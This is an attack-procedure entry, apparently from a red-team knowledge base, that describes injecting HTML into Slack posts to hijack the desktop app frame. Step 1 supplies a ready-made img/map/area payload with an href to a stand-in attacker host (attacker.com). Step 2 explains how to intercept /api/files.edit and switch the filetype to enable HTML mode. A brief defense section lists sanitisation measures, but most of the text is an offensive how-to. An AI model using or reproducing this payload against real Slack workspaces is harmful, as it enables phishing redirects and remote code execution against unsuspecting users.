---
id: proc-inject-html-slack-post
tags:
  - html-injection
  - xss
type: procedure
tools:
  - '[[tools/HTTP-Proxy]]'
  - '[[tools/Slack-Web-UI]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:15.165Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-HTML-Payload-into-Slack-Post

## Summary

This procedure injects arbitrary HTML tags like <map> and <area> into the Slack Post JSON to create a redirect to an attacker site upon click.

## Description

By editing the JSON via web UI or intercepting API requests, attackers insert unsanitized HTML that evades Slack's filters (bans <script> but allows <area>). This creates a large clickable image that redirects the desktop app frame to the RCE payload.

## Requirements

1. Private file URL from previous step.
2. HTTP proxy like Burp for request interception.
3. Slack team hostname and member ID.

## Defense

Defensive measures and detection strategies:

- Fully sanitize HTML in all editable fields, including <map>/<area>.
- Force _blank targets and validate hrefs.
- Detect proxy-intercepted API calls via anomaly detection.

## Objectives

1. Insert redirect HTML without triggering sanitization.
2. Create enticing large image for click.
3. Enable desktop app frame hijack.

## Instructions

### Step 1: Direct Edit via Web UI

**Context**: Use Slack's edit interface to inject HTML.

Navigate to https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit and insert: <img src="https://files.slack.com/..." width="10000" height="10000" usemap="#slack-img"><map name="slack-img"><area shape="rect" coords="10000,10000 0,0" href="https://attacker.com/t.html" target="_self"></map>.

> Save; JSON updates with injected tags.

### Step 2: Alternative Proxy Interception

**Context**: Modify filetype during upload/edit.

Intercept /api/files.edit with [[tools/HTTP-Proxy]] and change filetype to 'docs' to enable HTML mode.

> Request modified; response confirms edit.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/HTTP-Proxy]]
- [[tools/Slack-Web-UI]]

## Tags

- html-injection
- xss
